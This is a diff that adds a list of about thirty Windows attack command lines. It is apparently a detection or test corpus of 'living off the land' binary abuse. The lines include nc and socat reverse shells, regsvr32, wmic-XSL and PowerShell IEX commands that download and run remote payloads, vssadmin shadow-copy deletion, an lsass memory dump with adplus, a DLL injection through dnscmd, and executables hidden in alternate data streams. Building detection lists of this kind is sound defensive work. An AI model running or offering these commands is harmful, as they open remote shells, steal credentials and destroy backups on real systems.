@@ -1,0 +1,30 @@
+regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey
+nc.exe 193.168.100.113 4444 -e cmd.exe
+dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
+wmic os get /format:"https://11.11.11.11/payload.xsl"
+reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg
+cmd.exe /k < \\10.10.10.10\folder\batchfile.txt
+findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe
+wmic os get /format:"https://10.10.10.10/payload.xsl"
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
+C:\Windows\System32\Wbem\wmic.EXE os get /format:"http://sec.dashabi.in/javaw2/net/net.xsl"
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
+C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+forfiles /p c:\\windows\\system32 /m notepad.exe /c "c:\\folder\\normal.dll:evil.exe"
+esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o
+odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet
+regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll
+bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+regsvr32 /u /n /s /i:http://10.10.10.10/payload.sct scrobj.dll
+cmd.exe /k < \\webdavserver\folder\batchfile.txt
+regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll
+scp.exe -S "{CMD}" . localhost:.
+adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
+cdb.exe -cf {PATH:.wds} -o notepad.exe
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
+vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:
+xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -callBack {PATH:.exe}
+xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -preTraceCmd {PATH:.exe}
